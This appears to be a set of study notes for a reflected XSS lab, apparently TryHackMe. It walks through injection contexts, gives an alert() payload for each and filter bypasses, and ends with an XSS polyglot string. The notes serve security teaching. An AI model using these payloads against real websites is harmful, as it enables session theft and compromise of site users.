---
sidebar_position: 2
---

# XSS


Form asking you to enter your Name, and once you've entered your Name, it will be Presented on a Line Below.

- **Page Source**

```html
<form method="get">
    <div class="text-center">
        <div>Enter Your Name</div>
    </div>
</form>

<div class="text-center">
	<h2>Hello, {NAME}</h2>
</div>
```

- **Exploiting**
	- **PAYLOAD:** `<script>alert('XSS');</script></h2>`

```html
<div class="text-center">
	<h2>Hello, <script>alert('XSS');</script></h2>
</div>
```

<br/>

---


Form asking you to enter your Name. The Name is being reflected in `Input Tag`

- **Page Source**

```html
<form method="get">
    <div class="text-center">
        <div>Enter Your Name</div>
    </div>
</form>

<div class="text-center">
	<h2>Hello, <input value="Delaila"></h2>
</div>
```

- **Exploiting:** We need to escape the **Input Tag.**
	- **PAYLOAD:** `"><script>alert('XSS');</script>`
	- `">` closes the Value Parameter and then closes the Input Tag. Now the JavaScript can run.

```html
<div class="text-center">
	<h2>Hello, <input value=""><script>alert('XSS');</script></h2>
</div>
```

<br/>

---

Form asking you to enter your Name. The Name gets Reflected inside an HTML Tag, this time the `Textarea Tag`

- **Page Source**

```html
<form method="get">
    <div class="text-center">
        <div>Enter Your Name</div>
    </div>
</form>

<div class="text-center">
	<h2>Hello, <textarea>Delaila</textarea></h2>
</div>
```

- **Exploiting:** We need to escape the **Textarea Tag.**
	- **PAYLOAD:** `</textarea><script>alert('XSS');</script>`
	- `</textarea>` Causes the Textarea Element to Close so the Script will Run.

```html
<div class="text-center">
	<h2>Hello, <textarea></textarea><script>alert('XSS');</script></h2>
</div>
```

<br/>

---

Entering your Name into the Form, you'll see it Reflected on the Page. The Name gets Reflected into `JavaScript Code`

- **Page Source:** We have to escape the existing JavaScript Command to run our Code.

```html
<form method="get">
    <div class="text-center">
        <div>Enter Your Name</div>
    </div>
</form>

<div class="text-center">
	<h2>Hello, <span class="name"></span></h2>
</div>
<script>
	document.getElementsByClassName('name')[0].innerHTML='Delaila';
</script>
```

- **Exploiting:** We need to escape the Existing **JavaScript Command.**
	- **PAYLOAD:** `';alert('XSS');//`
	- `'` Closes the field specifying the Name
	- `;` Signifies the end of the Current Command
	- `//` Makes anything after it a Comment 

```html
<script>
	document.getElementsByClassName('name')[0].innerHTML='';alert('XSS');//;
</script>
```

<br/>

---

Form asking you to enter your Name, and once you've entered your Name, it will be Presented on a Line Below. **The Standard XSS PAYLOAD is not going Work, because there is some kind of Filtering.**


- **Page Source:** The word `script` gets removed from the PAYLOAD, that's because there is a Filter that Strips out any Potentially Dangerous Words.

```html
<form method="get">
    <div class="text-center">
        <div>Enter Your Name</div>
    </div>
</form>

<div class="text-center">
	<h2>Hello, <>alert('XSS');</></h2>
</div>
```

- **Exploiting:** Bypassing the Filter.
	- **PAYLOAD:** `<sscriptcript>alert('XSS');</sscriptcript>`

```js
<sscriptcript>alert('XSS');</sscriptcript> -->> <script>alert('XSS');</script>
```

<br/>

---

Form asking you to enter your Name. The Name is being reflected in an `IMG Tag`

- **Page Source:** The `<  >` characters get Filtered out from our PAYLOAD, preventing us from escaping the **IMG Tag.** To get around the filter, we can take advantage of the additional attributes of the IMG Tag, such as the **Onload Event.** The Onload Event Executes the Code once the Image specified in the `src` Attribute has Loaded onto the Web Page.

```html
<form method="get">
    <div class="text-center">
        <div>Enter An Image Path</div>
    </div>
</form>

<div class="text-center">
	<h2>Your Picture</h2>
	<img src=""scriptalert('XSS');/script>
</div>
```

- **Exploiting:** Bypassing the Filter.
	- **PAYLOAD:** `/images/cat.jpg" onload="alert('THM');`

```html
<div class="text-center">
	<h2>Your Picture</h2>
	<img src="/images/cat.jpg" onload="alert('XSS');" >
</div>>
```

<br/>

---

## Polyglots


An **XSS Polyglot** is a String of Text which can escape attributes, tags and **Bypass Filters All-In-One.**


- **This `PAYLOAD` can be used on all of the Examples Above**

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```